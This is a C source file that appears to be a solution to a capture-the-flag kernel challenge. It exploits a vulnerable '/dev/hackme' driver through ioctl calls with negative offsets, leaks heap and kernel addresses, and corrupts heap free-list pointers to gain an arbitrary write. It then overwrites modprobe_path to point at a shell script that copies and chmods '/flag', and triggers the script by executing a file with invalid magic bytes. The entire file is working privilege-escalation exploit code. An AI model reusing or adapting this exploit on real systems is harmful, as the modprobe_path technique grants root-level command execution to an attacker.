#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

struct Arg
{
    long int idx;
    char *content;
    long int size;
    long int offset;
};

void print_hex(char *buf, int size)
{
    int i;
    puts("======================================");
    printf("data :\n");
    for (i = 0; i < (size / 8); i++)
    {
        if (i % 2 == 0)
        {
            printf("%d", i / 2);
        }
        printf(" %16llx", *(size_t *)(buf + i * 8));
        if (i % 2 == 1)
        {
            printf("\n");
        }
    }
    puts("======================================");
}

int main()
{
    struct Arg arg;
    int fp = open("/dev/hackme", 0);
    if (fp < 0)
    {
        printf("[-] open /dev/hackme failed\n");
        exit(-1);
    }
    char *buf;
    long int heap_addr;
    long int kernel_addr;
    long int mod_tree_addr;
    long int mode_addr;
    long int pool_addr;
    long int modprobe_path_addr;

    buf = malloc(0x1000);
    memset(buf, 0, 0x1000);
    memset(buf, 'a', 0x100);
    arg.idx = 0;
    arg.content = buf;
    arg.size = 0x100;
    ioctl(fp, 0x30000, &arg);
    arg.idx = 1;
    ioctl(fp, 0x30000, &arg);
    arg.idx = 2;
    ioctl(fp, 0x30000, &arg);
    arg.idx = 3;
    ioctl(fp, 0x30000, &arg);
    arg.idx = 4;
    ioctl(fp, 0x30000, &arg);

    arg.idx = 1;
    ioctl(fp, 0x30001, &arg);
    arg.idx = 3;
    ioctl(fp, 0x30001, &arg);

    memset(buf, 0, 0x1000);
    arg.idx = 4;
    arg.content = buf;
    arg.offset = -0x100;
    arg.size = 0x100;
    ioctl(fp, 0x30003, &arg);
    print_hex(buf, sizeof(buf));
    heap_addr = *((unsigned long int *)buf);

    memset(buf, 0, 0x1000);
    arg.idx = 0;
    arg.content = buf;
    arg.offset = -0x200 + 0x28;
    arg.size = 0x200 - 0x28;
    ioctl(fp, 0x30003, &arg);
    print_hex(buf, sizeof(buf));
    kernel_addr = *((unsigned long int *)buf);
    mod_tree_addr = kernel_addr - 0x38ae0;

    memset(buf, 0, 0x1000);
    *((unsigned long int *)buf) = mod_tree_addr + 0x20;
    arg.idx = 4;
    arg.content = buf;
    arg.offset = -0x100;
    arg.size = 0x100;
    ioctl(fp, 0x30002, &arg);

    memset(buf, 'a', 0x100);
    arg.idx = 5;
    arg.content = buf;
    arg.size = 0x100;
    ioctl(fp, 0x30000, &arg);
    arg.idx = 6;
    ioctl(fp, 0x30000, &arg);

    memset(buf, 0, 0x1000);
    arg.idx = 6;
    arg.content = buf;
    arg.size = 0x8;
    arg.offset = -0x8;
    ioctl(fp, 0x30003, &arg);
    print_hex(buf, sizeof(buf));
    mode_addr = *((unsigned long int *)buf);
    pool_addr = mode_addr + 0x2400;

    arg.idx = 5;
    ioctl(fp, 0x30001, &arg);
    *((unsigned long int *)buf) = pool_addr + 0x90;
    arg.idx = 4;
    arg.content = buf;
    arg.offset = -0x100;
    arg.size = 0x100;
    ioctl(fp, 0x30002, &arg);

    modprobe_path_addr = mod_tree_addr + 0x2e960;
    memset(buf, 'a', 0x100);
    arg.idx = 7;
    arg.content = buf;
    arg.size = 0x100;
    ioctl(fp, 0x30000, &arg);
    arg.idx = 8;
    memset(buf, 0, 0x1000);
    *((unsigned long int *)buf) = modprobe_path_addr;
    *((unsigned long int *)buf + 1) = 0x100;
    ioctl(fp, 0x30000, &arg);

    strncpy(buf, "/home/pwn/copy.sh\x00", 18);
    arg.idx = 9;
    arg.content = buf;
    arg.size = 0x18;
    arg.offset = 0;
    ioctl(fp, 0x30002, &arg);

    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod +x /home/pwn/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
    system("chmod +x /home/pwn/dummy");
    system("/home/pwn/dummy");

    return 0;
}